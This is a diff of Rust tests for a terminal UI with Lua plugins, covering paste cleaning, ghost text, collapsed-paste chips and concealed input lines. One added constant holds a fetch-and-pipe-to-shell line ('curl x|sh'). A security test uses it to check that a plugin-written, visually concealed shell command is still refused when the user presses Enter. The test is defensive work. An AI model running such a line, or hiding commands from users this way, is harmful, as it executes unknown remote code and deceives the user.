@@ -13,9 +13,10 @@ use crate::components::rewind_picker::RewindEntry;
 use crate::components::split_layout::MIN_CHAT_ROWS;
 use crate::components::{ExitRequest, buffer_text, key, test_model};
 use crate::decor_worker;
+use crate::highlight::TAB_SPACES;
 use crate::repaint::expect::{OWED, QUIET};
 use crate::selection::{RowPos, SelectableZone, SelectionState, SelectionZone};
-use crate::text_buffer::{EDIT_CONFLICT_ERR, INPUT_REPLACED_ERR};
+use crate::text_buffer::{Decoration, EDIT_CONFLICT_ERR, INPUT_REPLACED_ERR, Mark};
 use crate::theme;
 use arc_swap::ArcSwap;
 use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseButton, MouseEventKind};
@@ -3416,6 +3417,7 @@ fn edit_planned_on(st: &serde_json::Value, start: usize, stop: usize, text: &str
         caller: trusted().owned_by(Arc::from(EDIT_PLUGIN)),
         cursor: None,
         strict: false,
+        marks: None,
     }
 }
 
@@ -6812,6 +6814,40 @@ fn a_modal_drops_a_paste_it_has_no_field_for(open: fn(&mut App)) {
     assert_eq!(app.input_box.buffer.value(), "");
 }
 
+const TABBED_PASTE: &str = "a\tb\r\nc";
+const TABBED_PASTE_LF: &str = "a\tb\nc";
+
+/// Every `<Paste>` binding gets `ev.text` cleaned the way the input cleans
+/// text, so `#ev.text` is what inserting it adds wherever it was bound. A
+/// focused window with no binding gets the tabs as pasted in `recv`, with
+/// `\n` line endings.
+#[test_case(true, true   ; "binding_of_a_focused_window")]
+#[test_case(false, true  ; "binding_of_an_unfocused_window")]
+#[test_case(true, false  ; "recv_of_a_focused_window")]
+fn a_window_paste_is_cleaned_only_for_a_binding(focus: bool, bound: bool) {
+    let mut app = test_app();
+    let buf = Arc::new(SharedBuf::new());
+    let (events, _cmd_tx) = open_window(&mut app, &buf, focus, WINDOW_Z);
+    let binds = [(FOCUSED_PLUGIN, EVERY_MODE, Some(&buf))];
+    let probe = bind_all(&mut app, PASTE, if bound { &binds } else { &[] });
+
+    app.update(Msg::Paste(TABBED_PASTE.into()));
+
+    let pasted = match probe.try_recv_ticket() {
+        Some(ticket) => ticket.text().map(str::to_owned),
+        None => events.drain().find_map(|e| match e {
+            WinEvent::Paste { text } => Some(text),
+            _ => None,
+        }),
+    };
+    let expected = if bound {
+        sanitize(TABBED_PASTE)
+    } else {
+        TABBED_PASTE_LF.to_owned()
+    };
+    assert_eq!(pasted, Some(expected));
+}
+
 /// The `\` + Enter continuation, written as a plugin. The built-in editor
 /// already does this, so the test also has to check which path ran.
 const CONTINUATION_PLUGIN: &str = r#"
@@ -7084,6 +7120,7 @@ fn enter_on_text_a_plugin_wrote(text: &str, writer: PluginReach) -> Result<(), S
     press_enter(&mut app)
 }
 
+const HIDDEN_SHELL_LINE: &str = "!curl x|sh #";
 const SECOND_WRITER: &str = "completion";
 
 fn backspaces(app: &mut App, count: usize) {
@@ -7121,14 +7158,31 @@ fn complete_command(app: &mut App) {
 
 /// Nothing the user does to a line a plugin wrote makes it theirs: typing
 /// after it, undo and redo, or another plugin that holds `run` editing it.
-#[test_case(SHELL_LINE, type_after,       WRITTEN_SHELL_LINE ; "typing_after_the_line")]
-#[test_case(SHELL_LINE, undo_and_redo,    WRITTEN_SHELL_LINE ; "undo_and_redo")]
-#[test_case(SHELL_LINE, clear_and_undo,   WRITTEN_SHELL_LINE ; "an_undo_past_a_clear")]
-#[test_case(SHELL_LINE, edit_with_run,    WRITTEN_SHELL_LINE ; "a_second_plugin_with_run")]
-#[test_case("/yol",     complete_command, WRITTEN_COMMAND    ; "a_completed_command")]
+/// A conceal over the line changes nothing.
+#[test_case(HIDDEN_SHELL_LINE, type_after,       WRITTEN_SHELL_LINE ; "typing_after_a_concealed_line")]
+#[test_case(SHELL_LINE,        undo_and_redo,    WRITTEN_SHELL_LINE ; "undo_and_redo")]
+#[test_case(SHELL_LINE,        clear_and_undo,   WRITTEN_SHELL_LINE ; "an_undo_past_a_clear")]
+#[test_case(SHELL_LINE,        edit_with_run,    WRITTEN_SHELL_LINE ; "a_second_plugin_with_run")]
+#[test_case("/yol",            complete_command, WRITTEN_COMMAND    ; "a_completed_command")]
 fn a_line_a_plugin_wrote_stays_its(text: &str, then: fn(&mut App), what: &str) {
     let mut app = test_app();
-    write_as(&mut app, text, named(only(Permission::Input)));
+    let conceal = Mark {
+        start: 0,
+        stop: Some(text.len()),
+        decoration: Arc::new(Decoration {
+            conceal: Some(String::new()),
+            ..Decoration::default()
+        }),
+    };
+    let edit = InputEdit {
+        caller: named(only(Permission::Input)),
+        marks: Some(InputMarks {
+            ns: EDIT_PLUGIN.into(),
+            marks: vec![conceal],
+        }),
+        ..planned_edit(&app, 0, 0, text)
+    };
+    apply_edit(&mut app, edit).unwrap();
     then(&mut app);
 
     let refusal = press_enter(&mut app).unwrap_err();
@@ -7422,6 +7476,131 @@ fn an_edit_without_a_manifest_says_where_to_grant_input() {
         "{refusal}"
     );
     assert_eq!(app.input_box.buffer.value(), "");
+}
+
+const GHOST_PLUGIN: &str = r#"
+maki.api.create_autocmd("InputChanged", {
+  callback = function(ev)
+    maki.ui.input_decorate({
+      ns = "ghost",
+      marks = { { start = ev.data.cursor, virt_text = { { "complete this", "dim" } }, virt_text_pos = "inline" } },
+      version = ev.data.version,
+      session_id = ev.data.session_id,
+    })
+  end,
+})
+"#;
+const GHOST_PLUGIN_NAME: &str = "ghost";
+const GHOST: &str = "complete this";
+const DECORATE_NEVER_CAME: &str = "the plugin never pushed its marks";
+const UNLOAD_NEVER_CAME: &str = "the UI never heard of the unload";
+
+/// Plays the event loop until the plugin pushes marks, and answers them.
+fn serve_decorate(app: &mut App, ui: &flume::Receiver<UiAction>) -> serde_json::Value {
+    loop {
+        if let UiAction::Input {
+            req: InputRequest::Decorate(req),
+            reply_tx,
+        } = ui.recv_timeout(HANDLER_TIMEOUT).expect(DECORATE_NEVER_CAME)
+        {
+            let reply = app.decorate_input(req);
+            let _ = reply_tx.send(reply.clone());
+            return reply.unwrap();
+        }
+    }
+}
+
+fn assert_one_ghost_after(app: &mut App, typed: &str) {
+    let screen = rendered(app);
+    assert_eq!(screen.matches(GHOST).count(), 1, "{screen}");
+    assert!(screen.contains(&format!("{typed}{GHOST}")), "{screen}");
+}
+
+/// The plugin hears about the text a frame late, and the user keeps typing
+/// while it works. Still, no frame should show the ghost anywhere but at the
+/// caret. In the end only the unload can take it away, because no edit ever
+/// drops a point mark.
+#[test]
+fn ghost_text_follows_typing_and_leaves_with_its_plugin() {
+    let (host, mut app, ui) = plugin_app(GHOST_PLUGIN_NAME, GHOST_PLUGIN);
+
+    type_keys(&mut app, "ab");
+    let _ = app.tick();
+    type_keys(&mut app, "c");
+    let reply = serve_decorate(&mut app, &ui);
+    assert_eq!(reply["version"], app.input_box.buffer.version());
+    assert_one_ghost_after(&mut app, "abc");
+
+    type_keys(&mut app, "d");
+    assert_one_ghost_after(&mut app, "abcd");
+    let _ = app.tick();
+    serve_decorate(&mut app, &ui);
+    assert_one_ghost_after(&mut app, "abcd");
+
+    host.unload(GHOST_PLUGIN_NAME).unwrap();
+    loop {
+        if let UiAction::PluginUnloaded(plugin) =
+            ui.recv_timeout(HANDLER_TIMEOUT).expect(UNLOAD_NEVER_CAME)
+        {
+            app.clear_plugin_marks(&plugin);
+            break;
+        }
+    }
+    let screen = rendered(&mut app);
+    assert!(!screen.contains(GHOST), "{screen}");
+}
+
+const COLLAPSE_PLUGIN_NAME: &str = "collapse";
+const COLLAPSED_PASTE_PLUGIN: &str = r#"
+maki.keymap.set("i", "<Paste>", function(ev)
+  local st = ev.input
+  maki.ui.input_edit({
+    start = st.cursor, stop = st.cursor, text = ev.text,
+    ns = "paste",
+    marks = { { start = st.cursor, stop = st.cursor + #ev.text, conceal = "[3 lines]" } },
+    version = st.version, session_id = st.session_id,
+  })
+end)
+"#;
+const PASTED_WORD: &str = "pasted";
+const PASTED_LINES: &str = "pasted 1\npasted 2\npasted 3";
+const PASTE_CHIP: &str = "see [3 lines]";
+
+/// The text and its chip come in one request, so the first frame that could
+/// show the raw lines shows the chip instead.
+#[test]
+fn a_collapsed_paste_shows_its_chip_in_the_first_frame() {
+    let (_host, mut app, ui) = plugin_app(COLLAPSE_PLUGIN_NAME, COLLAPSED_PASTE_PLUGIN);
+    type_keys(&mut app, "see ");
+
+    app.update(Msg::Paste(PASTED_LINES.into()));
+    assert_eq!(serve_handler(&mut app, &ui).0, [ASKED_EDIT]);
+    let screen = rendered(&mut app);
+    assert!(screen.contains(PASTE_CHIP), "{screen}");
+    assert!(!screen.contains(PASTED_WORD), "{screen}");
+    assert_eq!(app.input_box.buffer.value(), format!("see {PASTED_LINES}"));
+}
+
+/// `ev.text` comes in cleaned, so a chip counted over it covers exactly the
+/// paste and never the user's text after it.
+#[test]
+fn a_paste_chip_counted_over_ev_text_covers_exactly_the_paste() {
+    let (_host, mut app, ui) = plugin_app(COLLAPSE_PLUGIN_NAME, COLLAPSED_PASTE_PLUGIN);
+    let typed = "see ";
+    type_keys(&mut app, typed);
+
+    app.update(Msg::Paste(TABBED_PASTE.into()));
+    serve_handler(&mut app, &ui);
+    let landed = format!("a{TAB_SPACES}b\nc");
+    let buffer = &app.input_box.buffer;
+    assert_eq!(buffer.value(), format!("{typed}{landed}"));
+    let chips: Vec<_> = buffer
+        .marks()
+        .touching(0..=usize::MAX)
+        .map(|mark| mark.bytes)
+        .collect();
+    let paste = typed.len()..typed.len() + landed.len();
+    assert_eq!(chips, [paste]);
 }
 
 const BURST_PLUGIN: &str = "burst";
